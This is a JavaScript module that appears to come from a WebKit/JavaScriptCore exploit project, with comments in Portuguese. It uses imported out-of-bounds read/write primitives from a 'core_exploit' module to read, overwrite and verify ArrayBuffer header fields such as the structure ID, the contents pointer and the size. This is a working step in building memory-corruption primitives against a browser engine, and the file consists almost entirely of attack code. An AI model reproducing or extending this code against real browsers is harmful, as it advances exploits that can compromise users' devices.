// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// FUNÇÃO DE INVESTIGAÇÃO
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_DIAGNOSTIC = "diagnostic_v14_ValidateArrayBufferRW";
    logS3(`--- Iniciando Diagnóstico (${FNAME_DIAGNOSTIC}): Validar Leitura/Escrita no Cabeçalho do ArrayBuffer ---`, "test", FNAME_DIAGNOSTIC);

    try {
        await triggerOOB_primitive(); // Cria oob_array_buffer_real e oob_dataview_real
        if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute || !oob_read_absolute) {
            throw new Error("OOB Init ou primitivas R/W falharam.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_DIAGNOSTIC);
        logS3(`oob_array_buffer_real.byteLength (inicial): ${oob_array_buffer_real.byteLength}`, "info", FNAME_DIAGNOSTIC);

        const offsets_to_test = [
            JSC_OFFSETS.ArrayBuffer.STRUCTURE_ID_OFFSET,      // Supostamente 0x00 (se herdado de JSCell)
            JSC_OFFSETS.ArrayBuffer.FLAGS_OFFSET,             // Supostamente 0x04 (se herdado de JSCell)
            JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET,      // 0x08
            JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, // 0x10
            JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, // 0x18
            JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, // 0x20
            0x24, // Apenas mais um offset para teste
            0x28  // E outro
        ];

        const unique_offsets = [...new Set(offsets_to_test.filter(off => typeof off === 'number' && off >=0))].sort((a,b) => a-b);

        logS3("FASE 1: Lendo valores iniciais dos offsets de metadados do ArrayBuffer...", "info", FNAME_DIAGNOSTIC);
        const initial_values = {};
        for (const offset of unique_offsets) {
            if (offset + 8 <= oob_array_buffer_real.byteLength) { // Checar se cabe 8 bytes para ler como QWORD
                try {
                    let val = oob_read_absolute(offset, 8); // Ler como QWORD para ter mais info
                    initial_values[offset] = val;
                    logS3(`  Inicial @${toHex(offset,16)}: ${val.toString(true)}`, 'info', FNAME_DIAGNOSTIC);
                } catch (e) {
                    logS3(`  Erro ao ler inicial @${toHex(offset,16)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
                }
            } else if (offset + 4 <= oob_array_buffer_real.byteLength) { // Checar se cabe 4 bytes
                 try {
                    let val = oob_read_absolute(offset, 4);
                    initial_values[offset] = val;
                    logS3(`  Inicial @${toHex(offset,16)}: ${toHex(val)}`, 'info', FNAME_DIAGNOSTIC);
                } catch (e) {
                    logS3(`  Erro ao ler inicial @${toHex(offset,16)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
                }
            }
        }

        logS3("FASE 2: Escrevendo padrões distintos nos offsets de metadados...", "info", FNAME_DIAGNOSTIC);
        for (const offset of unique_offsets) {
            const pattern_low = 0xBAAD0000 | (offset & 0xFF);
            const pattern_high = 0xFEED0000 | (offset & 0xFF);
            const pattern64 = new AdvancedInt64(pattern_low, pattern_high);

            if (offset + 8 <= oob_array_buffer_real.byteLength) {
                try {
                    oob_write_absolute(offset, pattern64, 8);
                    logS3(`  Escrito ${pattern64.toString(true)} em @${toHex(offset,16)}`, 'info', FNAME_DIAGNOSTIC);
                } catch (e) {
                    logS3(`  Erro ao escrever em @${toHex(offset,16)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
                }
            } else if (offset + 4 <= oob_array_buffer_real.byteLength) {
                 try {
                    oob_write_absolute(offset, pattern_low, 4);
                    logS3(`  Escrito ${toHex(pattern_low)} em @${toHex(offset,16)}`, 'info', FNAME_DIAGNOSTIC);
                } catch (e) {
                    logS3(`  Erro ao escrever em @${toHex(offset,16)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
                }
            }
        }

        logS3("FASE 3: Lendo de volta os padrões escritos...", "info", FNAME_DIAGNOSTIC);
        let all_matched = true;
        for (const offset of unique_offsets) {
            const expected_pattern_low = 0xBAAD0000 | (offset & 0xFF);
            const expected_pattern_high = 0xFEED0000 | (offset & 0xFF);
            const expected_pattern64 = new AdvancedInt64(expected_pattern_low, expected_pattern_high);

            if (offset + 8 <= oob_array_buffer_real.byteLength) {
                try {
                    let val_read = oob_read_absolute(offset, 8);
                    logS3(`  Lido de @${toHex(offset,16)}: ${val_read.toString(true)} (Esperado: ${expected_pattern64.toString(true)})`, 'info', FNAME_DIAGNOSTIC);
                    if (!val_read.equals(expected_pattern64)) {
                        all_matched = false;
                        logS3(`    DISCREPÂNCIA ENCONTRADA em @${toHex(offset,16)}!`, 'error', FNAME_DIAGNOSTIC);
                    }
                } catch (e) {
                    all_matched = false;
                    logS3(`  Erro ao ler de volta @${toHex(offset,16)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
                }
            } else if (offset + 4 <= oob_array_buffer_real.byteLength) {
                 try {
                    let val_read = oob_read_absolute(offset, 4);
                    logS3(`  Lido de @${toHex(offset,16)}: ${toHex(val_read)} (Esperado: ${toHex(expected_pattern_low)})`, 'info', FNAME_DIAGNOSTIC);
                    if (val_read !== expected_pattern_low) {
                        all_matched = false;
                        logS3(`    DISCREPÂNCIA ENCONTRADA em @${toHex(offset,16)}!`, 'error', FNAME_DIAGNOSTIC);
                    }
                } catch (e) {
                    all_matched = false;
                    logS3(`  Erro ao ler de volta @${toHex(offset,16)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
                }
            }
        }

        if (all_matched) {
            logS3("VERIFICAÇÃO R/W: Todos os padrões lidos correspondem aos escritos.", 'good', FNAME_DIAGNOSTIC);
        } else {
            logS3("VERIFICAÇÃO R/W: Encontradas discrepâncias entre valores escritos e lidos.", 'warn', FNAME_DIAGNOSTIC);
        }

        // Especialmente, verificar o offset do tamanho (0x18)
        const size_offset = JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START; // 0x18
        if (unique_offsets.includes(size_offset)) {
            logS3(`Re-verificando valor original em ${toHex(size_offset)} (após todas as escritas):`, 'info', FNAME_DIAGNOSTIC);
            try {
                 // Se o valor em initial_values[size_offset] era AdvancedInt64, precisamos tratar
                let original_size_val_at_18 = initial_values[size_offset];
                let original_size_display = isAdvancedInt64Object(original_size_val_at_18) ? original_size_val_at_18.toString(true) : toHex(original_size_val_at_18);
                logS3(`  Valor original que estava em ${toHex(size_offset)} era: ${original_size_display}`, 'info', FNAME_DIAGNOSTIC);

                let current_val_at_18 = oob_read_absolute(size_offset, initial_values[size_offset] instanceof AdvancedInt64 ? 8 : 4);
                let current_val_display = isAdvancedInt64Object(current_val_at_18) ? current_val_at_18.toString(true) : toHex(current_val_at_18);
                logS3(`  Valor ATUAL em ${toHex(size_offset)} (após todos os testes): ${current_val_display}`, 'info', FNAME_DIAGNOSTIC);

                 if (oob_array_buffer_real.byteLength === 32768 && current_val_at_18 !== 32768 && current_val_at_18 !== 0) {
                    // Se o byteLength ainda é 32768 mas o campo em 0x18 não é (e não é o padrão escrito), é estranho.
                 } else if (current_val_at_18 === 0 && original_size_display.replace(/0x|_/g, '') !== '0000000000000000' && original_size_display !== '0x00000000') {
                    logS3(`  INTERESSANTE: ${toHex(size_offset)} voltou a ser zero ou era zero e não foi alterado de forma persistente pelo padrão.`, 'warn', FNAME_DIAGNOSTIC);
                 }


            } catch (e) {
                logS3(`  Erro ao re-verificar ${toHex(size_offset)}: ${e.message}`, 'error', FNAME_DIAGNOSTIC);
            }
        }

        logS3("Diagnóstico concluído.", "test", FNAME_DIAGNOSTIC);

    } catch (e) {
        logS3(`ERRO CRÍTICO no diagnóstico: ${e.message}`, "critical", FNAME_DIAGNOSTIC);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_DIAGNOSTIC);
        document.title = "Diagnóstico FALHOU!";
    } finally {
        clearOOBEnvironment();
        logS3(`--- Diagnóstico (${FNAME_DIAGNOSTIC}) Concluído ---`, "test", FNAME_DIAGNOSTIC);
    }
}
